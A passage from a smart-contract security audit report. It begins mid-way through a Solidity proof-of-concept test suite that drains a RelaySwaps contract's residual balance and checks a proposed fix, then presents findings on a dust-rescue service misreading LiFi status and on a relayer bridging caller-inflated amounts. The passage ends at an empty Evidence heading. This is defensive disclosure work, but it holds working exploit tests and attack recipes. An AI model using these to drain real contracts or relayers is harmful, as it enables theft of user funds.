    }

    /// Ceiling test: gasSwapMaxInput far above (residual + amount) cannot pull
    /// more than the contract holds -- max loot == residual, nothing more.
    function test_LootCeilingIsExactlyTheResidual() public {
        uint256 _residual = 500_000;
        usdc.mint(address(relaySwaps), _residual);
        uint256 _withdraw = 1_000_000;
        usdc.mint(address(pool), _withdraw);

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: 1,
            _gasPull: _residual + _withdraw + 1, // one wei-unit beyond the balance
            _gasMaxInput: type(uint256).max,     // unbounded approval
            _gasEthOut: 1 ether,
            _mainPull: 0,
            _mainEthRefund: 0,
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        vm.prank(attacker);
        vm.expectRevert(RelaySwaps.RelaySwaps_SwapFailed.selector); // balance-bounded
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0));
    }

    /// Pre-B2 baseline: with swapValue == 0 the gas-swap block is skipped and the
    /// ONLY approval is _amount - feeAmount, so an over-sized main pull that tries
    /// to reach the residual is stopped by the allowance, not the balance.
    function test_PreB2_ApprovalCapStopsResidualTheft() public {
        uint256 _residual = 500_000;
        usdc.mint(address(relaySwaps), _residual);
        uint256 _withdraw = 1_000_000;
        usdc.mint(address(pool), _withdraw);

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: 0,                       // B2 path OFF
            _gasPull: 0,
            _gasMaxInput: 0,
            _gasEthOut: 0,
            _mainPull: _withdraw + _residual,    // try to take the residual too
            _mainEthRefund: 0,
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        vm.prank(attacker);
        vm.expectRevert(RelaySwaps.RelaySwaps_SwapFailed.selector); // allowance-bounded
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0));
        assertEq(usdc.balanceOf(address(relaySwaps)), _residual, "residual untouched pre-B2");
    }

    /// Gas cost of the full attack path (MockPool skips Groth16 -- so this is a
    /// LOWER BOUND; real PoolVault.transact adds verifier + Poseidon tree inserts).
    function test_GasCost() public {
        uint256 _residual = 500_000;
        usdc.mint(address(relaySwaps), _residual);
        uint256 _withdraw = 1_000_000;
        usdc.mint(address(pool), _withdraw);

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: 0.001 ether,
            _gasPull: _residual,
            _gasMaxInput: _residual,
            _gasEthOut: 0.0015 ether,
            _mainPull: _withdraw,
            _mainEthRefund: 0,
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        vm.prank(attacker);
        uint256 _g = gasleft();
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0));
        emit log_named_uint("execute() gas (mock pool, no ZK verify)", _g - gasleft());
    }
}

/// @notice Separate suite: does the proposed fix actually close the hole?
///   Proposed fix:
///     require(_r.gasSwapMaxInput <= _amount - _r.feeAmount);
///   Simulated here by only ever choosing gasSwapMaxInput <= _amount - feeAmount.
contract GasSwapProposedFixPoC is RelaySwapsTest {
    address internal attacker = makeAddr("attackerY");

    function _routing(
        uint256 _swapValue,
        uint256 _gasPull,
        uint256 _gasMaxInput,
        uint256 _gasEthOut,
        uint256 _mainPull,
        address _dust
    ) internal view returns (RelaySwaps.SwapRouting memory _r) {
        _r = RelaySwaps.SwapRouting({
            swapTarget: address(swapper),
            approvalAddress: address(swapper),
            outputToken: address(usdc),
            recipient: address(0),
            feeRecipient: address(0),
            fallbackAddress: address(0),
            dustRecipient: _dust,
            feeAmount: 0,
            minOutputAmount: 0,
            nativeGas: 0,
            swapValue: _swapValue,
            gasSwapMaxInput: _gasMaxInput,
            gasSwapCalldata: abi.encodeCall(MockSwapper.gasSwapToSender, (address(usdc), _gasPull, _gasEthOut)),
            swapCalldata: abi.encodeCall(MockSwapper.reshieldBridge, (address(usdc), _mainPull, 0))
        });
    }

    /// The proposed bound is satisfied (gasSwapMaxInput == _amount - feeAmount) and the
    /// residual is STILL fully drained, because step 10 re-approves the full _swapAmount
    /// without subtracting what the gas swap already consumed. Total approval granted in
    /// one execution = gasSwapMaxInput + (_amount - feeAmount) = 2 x the entitlement.
    function test_ProposedFix_StillDrainsResidual() public {
        uint256 _residual = 900_000;
        usdc.mint(address(relaySwaps), _residual);
        uint256 _withdraw = 1_000_000;
        usdc.mint(address(pool), _withdraw);

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: 0.001 ether,
            _gasPull: _residual,          // pull the whole residual
            _gasMaxInput: _withdraw,      // == _amount - feeAmount: PASSES the proposed require
            _gasEthOut: 0.003 ether,
            _mainPull: _withdraw,         // main leg still gets its full entitlement
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        vm.prank(attacker);
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0));

        assertEq(usdc.balanceOf(address(relaySwaps)), 0, "residual STILL drained under the proposed fix");
        assertEq(attacker.balance, 0.003 ether - 0.001 ether, "attacker still paid");
    }

    /// Even with a TIGHT, SDK-sized gasSwapMaxInput (the real fixture ratio:
    /// gasSwapMaxInput = 3_697_477 on a 24_800_000 net, ~14.9%), the residual is
    /// still drainable up to that slice each execution, because the main-leg
    /// approval is never reduced by the gas-swap consumption.
    function test_SDKSizedBound_StillLeaksTheGasSliceEachExecution() public {
        uint256 _residual = 10_000_000;   // 10 USDC stranded
        usdc.mint(address(relaySwaps), _residual);
        uint256 _withdraw = 24_800_000;   // real fixture net
        usdc.mint(address(pool), _withdraw);
        uint256 _slice = 3_697_477;       // real fixture gasSwapMaxInput

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: 1_413_630_639_549_204, // real fixture swapValue
            _gasPull: _slice,             // pulled entirely out of the residual
            _gasMaxInput: _slice,         // exactly what the SDK sized
            _gasEthOut: 2 ether,
            _mainPull: _withdraw,         // full entitlement to the bridge
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        vm.prank(attacker);
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0));

        assertEq(usdc.balanceOf(address(relaySwaps)), _residual - _slice, "gas slice taken from the residual");
    }

    /// The one-line invariant that DOES close it: a floor check at the end of execute().
    /// Demonstrated negatively -- _inputNow < _inputBefore is reachable and unasserted.
    function test_InputFloorIsReachableAndUnasserted() public {
        uint256 _residual = 900_000;
        usdc.mint(address(relaySwaps), _residual);
        uint256 _withdraw = 1_000_000;
        usdc.mint(address(pool), _withdraw);

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: 1,
            _gasPull: _residual,
            _gasMaxInput: _residual,
            _gasEthOut: 1,
            _mainPull: _withdraw,
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        vm.prank(attacker);
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0)); // no revert
        assertLt(usdc.balanceOf(address(relaySwaps)), _residual, "balance fell below _inputBefore, silently");
    }
}
```

`test_MainLegStillSucceeds_WhenGasSwapEatsOnlyResidual` is the realistic shape and the one to read first. The gas swap consumes exactly the stranded 0.5 USDC while the main bridge leg still pulls the attacker's full 1 USDC entitlement, so the attacker's own reshield completes normally. It ends with `usdc.balanceOf(address(relaySwaps)) == 0` and the attacker up `0.0015 ether - _lzFee`, with `swapValue` set to a realistic 0.001 ETH lzFee rather than a 1-wei placeholder.

`test_NoResidual_AttackReverts` and `test_LootCeilingIsExactlyTheResidual` fix the bound from both sides. Against a clean contract the identical routing reverts, so nothing is ever taken from the pool. With `gasSwapMaxInput = type(uint256).max` and a pull one unit beyond the balance it also reverts: the loot ceiling is the balance, not the approval.

`test_PreB2_ApprovalCapStopsResidualTheft` is the control that isolates the regression. On the `swapValue == 0` path the gas-swap block is skipped, the only approval is `_amount - feeAmount`, and the identical over-pull is stopped by the allowance rather than the balance: `assertEq(usdc.balanceOf(address(relaySwaps)), _residual, "residual untouched pre-B2")`.

`test_InputFloorIsReachableAndUnasserted` states the defect as a bare invariant: the contract ends `execute` holding less of the input token than it started with, and nothing reverts.

The second suite holds `gasSwapMaxInput` inside the caller's own entitlement and re-runs the attack. `test_ProposedFix_StillDrainsResidual` sets `gasSwapMaxInput == _amount - feeAmount` and still ends with the contract at zero, and `test_SDKSizedBound_StillLeaksTheGasSliceEachExecution` uses the real fixture numbers, `gasSwapMaxInput = 3_697_477` base units against a `24_800_000` base-unit net, 3.697477 USDC against 24.8 USDC, and the fixture's own `swapValue`, to show the leak persists at production sizing, one gas slice per execution.

`test_GasCost` measures the attack at 211,422 gas against the mock pool. That is a lower bound: `MockPool` skips Groth16 verification and the Poseidon tree inserts that real `PoolVault.transact` performs.

One caveat. No fork or integration test was run: `MAINNET_RPC` and `B2_FORK_RPC_URL` are unset, and `RelaySwapsB2Fork.t.sol` is ENV-gated, so it skips rather than fails when they are absent. LiFi is not vendored as Solidity, so every passing test above uses `MockSwapper`. The remaining step, that a live allowlisted facet will pull the full standing allowance and deliver proceeds to a caller-named receiver, therefore rests on upstream Diamond semantics. It is partly closed inside the repository: decoding the captured LiFi calldata in `packages/swaps/test/fixtures/b2-lifi-op-usdc-to-mainnet-usdc.json`, the gas-swap leg is selector `0x2c57e884` against the Diamond, with `_receiver` at head word 3, `_minAmountOut` at head word 4, and `fromAmount` inside the nested `SwapData`. Both the pull size and the ETH destination are free fields of the real blob.

#### Recommendation

We recommend adding a floor assertion after step 10 so an execution can never leave the contract holding less of the input token than it started with, `require(_token.balanceOf(address(this)) >= _inputBefore, RelaySwaps_InputBalanceDeficit())`, or equivalently measuring the gas swap's consumption and subtracting it from the step-10 budget, which needs a balance snapshot taken before step 9.5: `uint256 _inputPreGasSwap = _token.balanceOf(address(this));` then `uint256 _spent = _inputPreGasSwap - _token.balanceOf(address(this)); uint256 _swapAmount = _amount - _r.feeAmount - _spent;`. Either form needs `RelaySwaps_InputBalanceDeficit()` declared alongside the contract's other errors, and either is needed on top of any bound on `gasSwapMaxInput`, which does not close this on its own because step 10 re-approves the full `_swapAmount` without subtracting what step 9.5 consumed.

We also recommend extending `test_StrandedBalanceUntouchedByExecuteDeltaSweep` with a `swapValue > 0` variant that drives an over-pulling `gasSwapCalldata`, since the existing test asserts the right property but cannot reach the code that breaks it; running `RelaySwapsB2Fork.t.sol` against an archive RPC before the remediation lands, so the pull semantics are closed against the production allowlist rather than a mock; and correcting the `gasSwapMaxInput` NatSpec on `SwapRouting` together with the What Gets Proof-Bound section of `withdraw-and-swap.md`, so the documented bound and the documented single scoped approval match what `execute` actually does.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #002 — `checkLeg` ignores `substatus`, so a failed destination deposit is treated as dust worth the whole principal

**Severity:** Medium · **Location:** `packages/relayer/dust-rescue-service/src/detection/detection.service.ts` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** PERM · **Root cause:** RC-01 (3 findings) · **Kill chain:** KC-03 · **Status:** Open

#### Description

A cross-chain reshield burns a user's note on one chain, bridges the money, and redeposits it on another. The nullifier is spent on the source chain immediately, inside `RelaySwaps.execute`, and the destination deposit is a call embedded in the LiFi route's destination calldata.

If that destination deposit reverts, the holder has nothing: the note on the source chain is burned and no note exists on the destination. LiFi refunds the full amount to `fallbackAddress`, which the SDK resolves to the relayer's own address. The design accepts this and names the remedy, saying the relayer "receives anything not redeposited and is expected to later turn it into a deposit on the user's behalf". That is what the dust-rescue service is for, so this path is the holder's recovery.

**Where it breaks.** The service sizes the rescue from LiFi's report, which on a reverted deposit gives the whole principal rather than the residue the service exists to sweep. It does not spend from where that money is:

- the refunded principal sits at `fallbackAddress`;
- the deposit is signed by the dust-rescue signer wallet, a different address, because `Entrypoint.deposit` pulls with `safeTransferFrom(msg.sender, ...)`, so whoever signs must already hold the tokens.

So the service tries to spend an amount from a wallet that never received it. Where the signer holds too little, which is the live state, the deposit reverts, the job burns its attempts and lands `FAILED`, and the recovery the design promised never happens. Where the signer holds enough, it pays the full principal out of a wallet whose balance is the pooled, unearmarked dust of every other pending job, into a note only the caller can spend.

One field decides which of the two amounts the service reads, and the service never reads it.

In `DetectionService`, the `checkLeg` helper decides how much of a cross-chain reshield to rescue from LiFi's own status record. It reads exactly two things from that record, the status word and `receiving.amount` with `receiving.txHash`:

```ts
if (status.status === "PENDING" || status.status === "NOT_FOUND") {
    return { outcome: "WAIT" };
}
if (status.status === "FAILED") {
    return { outcome: "FAILED", reason: status.substatus ?? "FAILED" };
}

// status.status === "DONE"
if (!status.receiving?.txHash || !status.receiving?.amount) {
    return { outcome: "WAIT" };
}
```

`substatus` is consulted only on the `FAILED` branch; on `DONE` it is never read. The amount is then parsed, carried through `DetectionService.check` as the job's `sweptAmount`, sized against the job's USD rate in `SweepService.handleAwaitingDestination`, and handed to `proveDustRescueDeposit` as the note's value.

`receiving.amount` does not mean "leftover". LiFi defines it as the amount of `toToken` credited to `toAddress` in the receiving transaction, and on this route `toAddress` is the route's `fallbackAddress`. That one address is paid in both outcomes, which is what makes the number ambiguous.

A cross-chain reshield carries an `Entrypoint.deposit` call inside the destination calldata of the LiFi route, and the reshield succeeds when that deposit mints the note. When the deposit executes, it consumes the bridged amount, and all that reaches `fallbackAddress` is the residue the swap over-delivered. When the deposit reverts, LiFi's executor catches the revert inside its own call frame and pays `fallbackAddress` the entire bridged amount instead. In LiFi's terms both are a delivery to `toAddress`, so both are reported as `DONE` carrying an amount. The field that separates them is `substatus`, which reads `COMPLETED` for the first and `PARTIAL` for the second.

The repository's own dust-leftover observer measures the successful case and names the address, recording its method as the balance delta at `fallbackAddress` and annotating that address as the relayer's own. On a 10 USDC transfer it records 9.716207 USDC minted as the note, 9.813369 USDC consumed in total, and `0.032919` USDC arriving at `fallbackAddress`, which its own output puts at 0.33 per cent of the transfer.

LiFi's production records for this deployment show both quantities arriving in that one field. Across forty answered transfers from the relayer's Arbitrum `RelaySwaps`, thirty-two report `DONE` / `COMPLETED` with a residue of that shape. Four report `DONE` / `PARTIAL` with `receiving.amount` equal to the whole bridged amount. The API returns these in base units, and the assets are six-decimal, so the four read as 9.905027, 9.915818 and 9.910064 USDT and 9.918626 USDC rather than as the nine-million figures the raw integers suggest. Against the 0.032919 USDC residue of a successful transfer of the same size, the same field is carrying a number roughly three hundred times larger, and `checkLeg` has nothing in hand to tell which of the two it is holding.

The on-chain record confirms that mechanism for the first of those four. Its source transaction is `0xb83d59c5173143803e0cbd68cb7a12710496d38ea6cad81976d51a5e45123e22`, a call to `RelaySwaps.execute` on Arbitrum, and its destination receipt on Base is `0x5cc08427501156897ee0b830b00c912c03ad5efedf09bf77b3970e7a9b7b7ed3`. That receipt reports success, `status: 0x1`, and carries six logs. Read in order they are the whole sequence: 9,905,027 base units of Base USDT arrive at LiFi's receiver contract; the receiver approves exactly that amount to the contract it is about to call, which is the step that precedes the embedded deposit; the entire 9,905,027 is then transferred onward to `0xa60748B7E7BBdE1D97b5c258f1b317E748E6FccF`; and the approval is reset to zero.

Two things are absent from that list and both matter. Nothing consumed the approval, which is what a successful deposit would have done. And there is no `Entrypoint` deposit event of any kind, which a successful reshield would have emitted. What the logs show instead is an approve, an attempt, and a refund of the full amount: the embedded deposit reverted, LiFi's executor caught the revert inside its own call frame, and paid the whole bridged amount to `fallbackAddress`. Because the executor swallowed the revert, the outer transaction still succeeded, which is why the receipt reports `0x1` on a transfer that minted no note.

That `fallbackAddress` is the same address that sent the source transaction on Arbitrum, and it is the address the observer runs name as the relayer's own, so the full bridged amount returned to the party that sent it. LiFi's report of the event is accurate on its own terms, because the whole amount genuinely was delivered to `toAddress`. To `checkLeg`, which reads the status word and not the substatus, it is a successful `DONE` carrying 9.905027 USDT of dust to rescue.

The one guard on this branch cannot see the failure. After parsing the amount, `checkLeg` fetches the receipt for `status.receiving.txHash` on the destination chain and returns `FAILED` unless `receipt.status === "success"`. The class doc calls it "a cheap receipt-status check [that] guards against LiFi reporting DONE for a transaction that actually reverted", and against that failure mode it works. The transaction it inspects is LiFi's executor transaction, which succeeds on this path: the executor is designed to catch a reverting destination call and pay `fallbackAddress` instead, so the revert is swallowed inside the call frame and never reaches the outer receipt status. The receipt above is the proof, `status: 0x1` on a transfer that minted no note.

The fields that would disambiguate the record are dropped one layer down. `LiFiSwapQuoteProvider.mapStatusResponse` carries `substatus` through into `SwapStatusResult`, so it is available to `checkLeg` and is simply not read on `DONE`. The receiving-leg fields are mapped by `mapTransactionInfo`, which retains only `txHash`, `chainId`, `txLink`, `amount` and `amountUSD`. `SwapTransactionInfo` declares no token and no `toAddress` field at all, so the service could not assert either one today even if it tried.

The job the service executes is authored by the relay caller, and so is the destination call that fails. `zDustRescue` sits beside `signedSwapCommitment` in `zEvmRelaySwapRequest` rather than inside it, and validates only shape: a positive integer chain id, an EVM address, a well-formed stealth identifier. `EvmRelayService.relaySwap` reads `request.dustRescue.destinationChainId`, `request.dustRescue.tokenId` and `request.dustRescue.recipientIdentifier` straight off the request into `registerPending` with no comparison against the proof or the commitment. The commitment is relayer-signed, but that says who signed it rather than who wrote it: `zEvmSwapQuoteRequest` carries `swapCalldata`, `swapTarget`, `approvalAddress` and `fallbackAddress` as caller-supplied request fields, with its `superRefine` making `swapCalldata` and `swapTarget` mandatory on any committed quote, and `EvmQuoteService.createRelaySwapFeeCommitment` encodes exactly those values into the routing blob before signing it. `RelaySwaps.execute` constrains `swapTarget` and `approvalAddress` to `approvedRouters` and constrains nothing inside `swapCalldata`. A relayer-side re-derivation of the route, or any validation of `swapCalldata` beyond the router allowlist, would falsify this, and there is neither. The destination `Entrypoint.deposit` call, its amount, the route's slippage and the fallback receiver are therefore the caller's, and the design's own Leg-2 taxonomy names the resulting failure mode: when the deposit call reverts on insufficient swap output, "LiFi's executor falls back to sending the raw bridged tokens to `fallbackAddress`".

The four observed records predate the remediation of the trigger they exhibit. All four are the 2026-08-18 destination-deposit reverts named in the comment above `depositGasLimit: "800000"` in `PoolSessionReshieldCrosschain`, and their cause was OutOfGas: a Groth16 `verifyProof` plus a LeanIMT insert against the provider's shared `300000` default. That specific cause is addressed in this commit. What the records establish is not the trigger but LiFi's reporting semantics, that a reverted destination deposit yields `DONE` with `substatus: PARTIAL` and `receiving.amount` equal to the whole principal, independent of why the deposit reverted. The other trigger named in the Leg-2 taxonomy, insufficient swap output, is untouched by a gas-limit change, and `800000` is itself a fixed figure calibrated for `transact_1x1` against a cost whose LeanIMT term grows with tree depth, asserted nowhere and re-checked nowhere.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/detection/detection.service.ts#L69-L113
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/LiFiSwapQuoteProvider.ts#L303-L347
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/types/SwapStatusProvider.ts#L47-L58
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/evm.relay.service.ts#L461-L506
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L57-L92

#### Impact

On the `PARTIAL` path the effect that lands today is that the user's principal is never returned. The source nullifier was burned inside `RelaySwaps.execute` before the hop and no destination note exists, so the principal sits at an operator-controlled fallback address with no on-chain claim attached, and the dust-rescue service is the mechanism the design names for returning it: the relayer "receives anything not redeposited and is expected to later turn it into a deposit on the user's behalf". `0xa60748B7E7BBdE1D97b5c258f1b317E748E6FccF` holds 14.823213 USDT on Base today, including the 9.905027 from the receipt above. The misread makes the job that should return that money size itself at the whole principal rather than at the residual, and the oversized deposit then fails: `Entrypoint.deposit` pulls funds with `_asset.safeTransferFrom(msg.sender, address(this), _amountPlusFees)`, the signing wallet does not hold that much, `SweepService.recordFailure` burns the job's attempts against `sweepMaxAttempts`, and the job lands `FAILED` after the approval transaction has already been paid for.

Where the signing wallet does hold enough, the same misread spends it, capped by the operator float and out of reach at current balances: read on 2026-09-14, the dust-rescue signer `0x0967755AfA2016866D12EefB820705026842dCe8` holds 3.317616 USDT on mainnet and 0.494978 USDC on Optimism, zero of either stablecoin on Arbitrum and Base, and no ETH on Optimism. The money the deposit spends is not the money it is sizing. The tokens come out of the balance of whoever signs, while the principal itself went to `fallbackAddress`, which `PoolSessionReshieldCrosschain` resolves as `fallbackAddress ?? relayerInfo.address` and which on the live stack is a different address, and because `checkLeg` never reads `toAddress` the service never establishes that the amount it is about to spend arrived at the wallet it spends from. The only thing that puts tokens in that wallet is arriving user dust: the design collapsed to a single key because "`Entrypoint.deposit()` pulls funds via `safeTransferFrom(msg.sender, ...)`, so whoever signs the deposit must already hold the tokens", the package's operating instructions tell an operator to fund a rotated address with native gas and nothing else, and no token top-up path exists in the package. The wallet's per-token balance is therefore the pooled, unearmarked sum of every pending job's dust, and a principal-sized deposit draws on that pool for the entire `sweptAmount` plus the vetting fee plus gas. The note it buys belongs to the stealth address `proveDustRescueDeposit` derives from the caller's `recipientIdentifier`, with its spending secret encrypted under the stealth-derived shared secret, so there is no operator route back. The wallet accumulates user dust by design, so that cap moves with it.

A cross-asset `PARTIAL`, where the destination swap failed and the bridged token arrived instead, miscounts more quietly, and this leg is reasoned from the code rather than observed. `sweptAmountUsdMicros` divides the amount by `10 ** usdRate.tokenDecimals`, and `usdRate` was priced once at registration by `DustRescuePricingService.priceForRescue` against the caller's `dustRescue.tokenId` rather than against whatever LiFi delivered. A delivered token with more decimals than the priced one understates the USD figure and terminates the job as `BELOW_THRESHOLD`, a terminal state absent from `SweepService.advance`'s switch, leaving the balance with no job referencing it; fewer decimals overstates it. Either way the deposit is built on `job.tokenId` regardless of what arrived.

#### Recommendation

We recommend reading the field that already disambiguates the record: on `DONE`, require `substatus === "COMPLETED"` before treating `receiving.amount` as leftover, and treat `PARTIAL` and `REFUNDED` as terminal non-rescue outcomes with their own recorded reason, distinct from the `FAILED` branch. `mapStatusResponse` already carries `substatus` to the call site and `receiving.chainId` is already mapped, so asserting that chain id against the job's destination chain in the same place needs no SDK change. Bound the amount independently of LiFi as well: a rescue is by definition a remainder, so compare the reported amount against the transfer's own principal and refuse anything at or near it. That bound holds even if LiFi's `substatus` semantics change, and it is the one that would have stopped all four observed records. Replace the receipt-status gate with one that decodes the receipt's logs for the destination `Entrypoint` deposit event, since `receipt.status` cannot see a destination call that LiFi's executor caught and compensated.

We also recommend extending `SwapTransactionInfo` and `mapTransactionInfo` to retain the delivered token and the delivering address, then asserting that the delivered token matches the job's asset and that `toAddress` is the service's own rescue address before sizing anything. Both the cross-asset miscount and the spend-from-the-pool behaviour follow directly from the absence of those two fields, and the same assertion is what ties the job's asset and destination chain to the delivery actually observed rather than to the caller's `dustRescue` block.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #003 — The relayer bridges its own tokens for an amount measured at a caller-chosen `dustRecipient`

**Severity:** Medium · **Location:** `packages/relayer/relayer/src/relay/evm/dust-rescue-forwarding.service.ts` · **Bug:** Medium · **Payout:** High · **Novelty:** NEW · **Reach:** PERM · **Root cause:** RC-01 (3 findings) · **Kill chain:** KC-03 · **Status:** Open

#### Description

A cross-chain relay swap, a reshield, withdraws a user's note on one chain, swaps and bridges the proceeds, and redeposits them into the pool on another. A swap never lands exactly on its target, so a remainder of the withdrawn token is left behind on the source chain. The contract sweeps that remainder to an address named in the routing, and the design expects that address to be the relayer's own.

Left there, the remainder is the user's money sitting in the relayer's wallet, outside the pool and attached to no note. Dust rescue is the remedy the design names for that: the relayer bridges the remainder to the destination chain and a rescue service on the far side deposits what arrives as a fresh note the user owns. The relayer pays for that bridge itself, from the same key the remainder was swept into, which is why the design treats the leg as introducing no new custody.

**Where it breaks.** The relayer measures the remainder at one address and pays for it from another, and nothing establishes that the two are the same:

- the amount to bridge is read off the relay's own receipt, by summing the token transfers that paid `dustRecipient`, an address the caller supplies in the quote request and the relayer checks only for not being the zero address;
- the tokens are spent from the relayer's own signer balance, which holds the remainder only if `dustRecipient` was in fact the relayer.

So a caller who names an address that receives the entire withdrawal rather than a crumb of it, and one such address is a public contract that needs nothing crafted, makes the relayer bridge that whole sum out of its own float, and the rescue service on the far side mints what arrives into a shielded note only the caller can spend.

When a cross-chain relay swap opts into dust rescue, `DustRescueForwardingService.forward` moves the source-chain leftover to the destination chain so the rescue service can deposit it. It establishes the amount from the relay-swap receipt and pays for the bridge from its own signer.

`parseSweptAmount` scans the receipt's logs for `Transfer` events of the proof asset, the token the user's proof withdrew, and sums those whose `to` equals the recipient it was given:

```ts
if (getAddress(decoded.args.to) === wantRecipient) {
    total += decoded.args.value;
    found = true;
}
```

That recipient is `routing.dustRecipient`, a field of the quote request (`dustRecipient: zEvmAddress` in the relayer's quote schema), normalised with `getAddress` and encoded into the routing blob by `createRelaySwapFeeCommitment`, which the relayer then signs. At relay time `relaySwap` re-decodes the blob and applies exactly one check to the field: it rejects the zero address, mirroring `RelaySwaps_ZeroDustRecipient()` on chain. A comparison of `dustRecipient` against the relayer's own signer or against its configured `dustRescueRecipientAddress`, anywhere between the quote request and the bridge broadcast, would falsify this finding, and across `quoteSwap`, `createRelaySwapFeeCommitment`, the routing validation in `relaySwap` and `forward` there is none. Both `quoteSwap` and `relaySwap` are unauthenticated HTTP routes, rate-limited only.

`forward` then sends the bridge transaction from the relayer's own account:

```ts
const fromAddress = await this.chainService.signerAddress();
...
await this.maybeApprove(fromAddress, params.proofAsset, quote.approvalAddress, sweptAmount);
```

The two halves do not refer to the same pot of money: the amount is measured from transfers to an address the caller picked, and the tokens are spent from the relayer's signer balance. Nothing reconciles them, with no check that the measured transfers came from this relay's own residue, no ceiling relative to the relay's value, and no assertion that `dustRecipient` is the relayer's own address.

The measured amount is bounded by nothing resembling dust. `MIN_FORWARD_AMOUNT` and `minWorthUsdMicros` are both floors, and `forward` has no ceiling of any kind. `RelaySwaps` contains no dust cap either, since `_sweepDust` transfers the full `_inputNow - _inputBefore` delta with no bound. The only 3% bound in the system, `SWAP_DUST_TOLERANCE_BPS` in the SDK's `assertLifiBudget`, is a client-side assertion in `LiFiBudget`, which a caller submitting directly to the HTTP routes never runs.

Two choices of `dustRecipient` raise the measured amount to the whole withdrawal, or nearly all of it, and the stronger needs no crafted calldata. The first points `dustRecipient` at the `RelaySwaps` contract itself. `PoolVault.transact` requires `_transactParams.processor == msg.sender` and then pays the withdrawal to `msg.sender` through `_transferAsset`, whose ERC-20 branch is `safeTransfer(msg.sender, _value)` under the comment "Transfer amountOut to msg.sender (can be processor contract or direct caller)". On this path `msg.sender` is `RelaySwaps`, so the receipt carries a single `Transfer` of the proof asset whose `to` is the `RelaySwaps` address, for the proof's whole `amountOut`, the entire amount withdrawn, and `parseSweptAmount` sums exactly that. Nothing is subtracted, because `forward` deducts the relay fee only when `feeRecipient` equals `dustRecipient` while `relaySwap` pins `feeRecipient` to the relayer's own address via `resolveFeeReceiver`, so the two never coincide here. The attacker supplies one static, publicly known contract address.

The second is to point `dustRecipient` at the attacker's own address and submit a swap that consumes nothing. On the cross-chain reshield path `recipient` is the zero address, which `execute` requires to come with `minOutputAmount == 0`, so the balance-delta output guard never runs. The only condition on the swap is that the call to the allowlisted router returns success, so any successful but non-consuming call leaves the entire `_swapAmount` in the contract, `_sweepDust` transfers it to the attacker, and that transfer is what `parseSweptAmount` measures. The attacker keeps the residue on chain and has it counted as the amount the relayer must bridge from its own float.

The bridged value is then minted into a note the caller owns. The request's `dustRescue` block carries a `recipientIdentifier` that sits beside `signedSwapCommitment` rather than inside it: no proof, no commitment signature and no on-chain `SwapRouting` field covers it, its schema `zStealthRecipientIdentifier` is a shape check over raw public keys, and `relaySwap` passes it untouched into `registerPending`. On the destination side, `DetectionService.check` adds the forwarded leg's amount to LiFi's self-reported destination-chain leftover, so the note is sized by what the inflated bridge actually delivers net of bridge fees, and `SweepService.handleProving` calls `proveDustRescueDeposit` with that total and that identifier. The prover resolves the identifier to a meta-address, derives a stealth address, computes `noteAddressHash` against it and `precommitment` over `job.sweptAmount`, encrypts under the stealth-derived shared secret what its own comment calls "the full note payload … the recipient needs to reconstruct a spendable note", and returns a plain `Entrypoint.deposit` call that `ChainWriteService` signs with the rescue service's own key. Because `Entrypoint.deposit` pulls funds with `safeTransferFrom(msg.sender, ...)`, the tokens come out of that signer's wallet.

That wallet is the same one the forward bridges into. The design document's Key custody section states it plainly: the single dust-rescue signer address is both where dust #2 lands and "where dust #1 gets forwarded to", and "what signs the eventual rescue deposit". So the relayer bridges an inflated amount of its own tokens to its own rescue wallet, and the rescue service spends that wallet to mint a shielded note of the same size owned by the caller.

The design assumed the guard that is missing. The same document says the forward uses the relayer's own chain signer, "the same key that already holds the swept dust, so no new custody role is introduced for this leg", which assumes `dustRecipient` is the relayer without enforcing it. The SDK does enforce it: `prepareReshieldCrosschainQuote` throws `DustRescueRecipientConflict` when a `dustRescue` opt-in carries a `dustRecipient` other than the relayer's address. That check lives entirely in the untrusted client and is bypassed by calling the relayer's HTTP routes directly.

#### Evidence

